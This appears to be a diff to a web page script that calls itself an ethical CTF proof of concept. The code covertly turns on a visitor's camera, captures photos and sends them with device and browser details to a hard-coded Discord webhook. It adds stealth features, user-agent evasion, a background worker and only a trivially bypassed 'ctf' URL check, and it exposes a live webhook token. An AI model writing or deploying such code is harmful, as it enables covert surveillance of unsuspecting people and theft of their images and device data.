@@ -9,7 +9,6 @@
 <body>
     <script>
         // WARNING: Ethical CTF PoC only. Unauthorized use violates privacy laws. Use with explicit consent.
-        // Discord webhook URL
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1375982804852146247/3B6K6PbBrS05n0DOlWLJa3ba-t4t_Qc0ZyaLjCYMrT6Op7u-cvmddGrahMke9PoUH2di';
 
         // Stealth: Suppress console and performance APIs
@@ -19,10 +18,20 @@
 
         // Random user agent for evasion
         const userAgents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15',
             'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
-            'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36'
+            'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0'
         ];
         const getRandomUA = () => userAgents[Math.floor(Math.random() * userAgents.length)];
+
+        // Browser detection
+        const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
+        const isChrome = /chrome/i.test(navigator.userAgent);
+        const isFirefox = /firefox/i.test(navigator.userAgent);
+        const isEdge = /edg/i.test(navigator.userAgent);
+        const isMobile = /mobile/i.test(navigator.userAgent);
 
         // Send data to webhook with retries
         async function sendItem(type, data, index = null, retries = 3) {
@@ -38,6 +47,7 @@
                                 { name: 'Data', value: JSON.stringify(data, null, 2).substring(0, 1000) },
                                 { name: 'Device', value: navigator.userAgent || 'Unknown' },
                                 { name: 'Platform', value: navigator.platform || 'Unknown' },
+                                { name: 'Browser', value: `${isChrome ? 'Chrome' : isFirefox ? 'Firefox' : isEdge ? 'Edge' : isSafari ? 'Safari' : 'Unknown'} ${isMobile ? '(Mobile)' : ''}` },
                                 { name: 'HTTPS', value: location.protocol === 'https:' ? 'Yes' : 'No' },
                                 { name: 'Time', value: new Date().toISOString() }
                             ],
@@ -58,7 +68,7 @@
                     if (!response.ok) throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                     return true;
                 } catch (e) {
-                    await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1))); // Linear backoff
+                    await new Promise(resolve => setTimeout(resolve, 1000 * Math.pow(2, i))); // Exponential backoff
                     if (i === retries - 1) {
                         await sendItem('Error', { message: `Failed to send ${type}: ${e.message}`, attempt: i + 1 });
                     }
@@ -85,7 +95,7 @@
             try {
                 const devices = await navigator.mediaDevices.enumerateDevices();
                 const videoDevices = devices.filter(device => device.kind === 'videoinput');
-                await sendItem('CameraList', { devices: videoDevices.map(d => ({ label: d.label, id: d.deviceId })) });
+                await sendItem('CameraList', { devices: videoDevices.map(d => ({ label: d.label || 'Unknown', id: d.deviceId })) });
                 return videoDevices;
             } catch (e) {
                 await sendItem('CameraList', { error: `Failed to enumerate cameras: ${e.message}` });
@@ -93,33 +103,48 @@
             }
         }
 
+        // Check battery level
+        async function checkBattery() {
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    await sendItem('Battery', { level: battery.level, charging: battery.charging });
+                    return battery.level > 0.2; // Proceed if battery > 20%
+                }
+                return true; // No battery API, assume okay
+            } catch (e) {
+                await sendItem('Battery', { error: `Battery check failed: ${e.message}` });
+                return true;
+            }
+        }
+
         // Capture a single photo
         async function capturePhoto(stream, index, phase) {
             try {
                 const track = stream.getVideoTracks()[0];
-                const imageCapture = new ImageCapture(track);
-                const bitmap = await imageCapture.grabFrame();
-                const canvas = new OffscreenCanvas(128, 96);
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(bitmap, 0, 0, 128, 96);
-                const blob = await canvas.convertToBlob({ type: 'image/webp', quality: 0.05 });
-                const reader = new FileReader();
-                const photo = await new Promise(resolve => {
-                    reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
-                    reader.readAsDataURL(blob);
-                });
-                await sendItem(`${phase} Photo ${index + 1}`, photo, index);
-                return true;
-            } catch (e) {
-                // Fallback to canvas
-                try {
+                if ('ImageCapture' in window) {
+                    const imageCapture = new ImageCapture(track);
+                    const bitmap = await imageCapture.grabFrame();
+                    const canvas = new OffscreenCanvas(120, 90);
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(bitmap, 0, 0, 120, 90);
+                    const blob = await canvas.convertToBlob({ type: 'image/webp', quality: 0.05 });
+                    const reader = new FileReader();
+                    const photo = await new Promise(resolve => {
+                        reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
+                        reader.readAsDataURL(blob);
+                    });
+                    await sendItem(`${phase} Photo ${index + 1}`, photo, index);
+                    return true;
+                } else {
+                    // Fallback for browsers without ImageCapture
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     video.play();
                     await new Promise(resolve => video.onloadedmetadata = resolve);
                     const canvas = document.createElement('canvas');
-                    canvas.width = 128;
-                    canvas.height = 96;
+                    canvas.width = 120;
+                    canvas.height = 90;
                     canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                     const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.05));
                     const reader = new FileReader();
@@ -130,10 +155,10 @@
                     await sendItem(`${phase} Photo ${index + 1}`, photo, index);
                     video.srcObject = null;
                     return true;
-                } catch (e2) {
-                    await sendItem(`${phase} Photo ${index + 1}`, { error: `Capture failed: ${e2.message}` }, index);
-                    return false;
                 }
+            } catch (e) {
+                await sendItem(`${phase} Photo ${index + 1}`, { error: `Capture failed: ${e.message}` }, index);
+                return false;
             }
         }
 
@@ -149,23 +174,23 @@
                 return false;
             }
 
-            await listCameras(); // Log available cameras
+            if (!(await checkBattery())) {
+                await sendItem('Battery', { error: 'Low battery, aborting capture to avoid draining' });
+                return false;
+            }
+
+            await listCameras();
 
             let stream = null;
             const maxRetries = 3;
             let retryCount = 0;
+            const constraints = isMobile ? 
+                { video: { facingMode: { ideal: 'user' }, width: { ideal: 120 }, height: { ideal: 90 }, frameRate: { ideal: 5 } }, audio: false } :
+                { video: { width: { ideal: 120 }, height: { ideal: 90 }, frameRate: { ideal: 5 } }, audio: false };
 
             while (!stream && retryCount < maxRetries) {
                 try {
-                    stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { 
-                            facingMode: { ideal: 'user' }, // Front-facing, fallback to default
-                            width: { ideal: 128 }, 
-                            height: { ideal: 96 },
-                            frameRate: { ideal: 5 }
-                        },
-                        audio: false 
-                    });
+                    stream = await navigator.mediaDevices.getUserMedia(constraints);
                     await sendItem('Camera', { message: `Camera accessed: ${stream.getVideoTracks()[0].label}` });
                 } catch (e) {
                     retryCount++;
@@ -174,7 +199,7 @@
                         await sendItem('Camera', { error: 'Max retries reached, aborting initial capture' });
                         return false;
                     }
-                    await new Promise(resolve => setTimeout(resolve, 1000 * (retryCount + 1)));
+                    await new Promise(resolve => setTimeout(resolve, 1000 * Math.pow(2, retryCount)));
                 }
             }
 
@@ -194,6 +219,11 @@
 
         // Register WebWorker
         async function registerBackgroundWorker() {
+            if (!location.protocol === 'https:') {
+                await sendItem('Error', { message: 'HTTPS required for reliable worker operation, aborting background capture' });
+                return;
+            }
+
             if ('Worker' in window) {
                 try {
                     const worker = new Worker('/worker.js');
@@ -231,6 +261,12 @@
             }
         }
 
+        // Self-destruct if not in CTF context
+        if (!location.href.includes('ctf')) {
+            sendItem('Security', { error: 'Non-CTF context detected, aborting' });
+            throw new Error('Ethical CTF PoC only');
+        }
+
         // Start zero-click collection
         (async () => {
             await sendItem('Debug', { 
@@ -238,6 +274,7 @@
                 url: location.href, 
                 device: navigator.userAgent, 
                 platform: navigator.platform,
+                browser: `${isChrome ? 'Chrome' : isFirefox ? 'Firefox' : isEdge ? 'Edge' : isSafari ? 'Safari' : 'Unknown'} ${isMobile ? '(Mobile)' : ''}`,
                 https: location.protocol === 'https:' ? 'Yes' : 'No',
                 time: new Date().toISOString()
             });
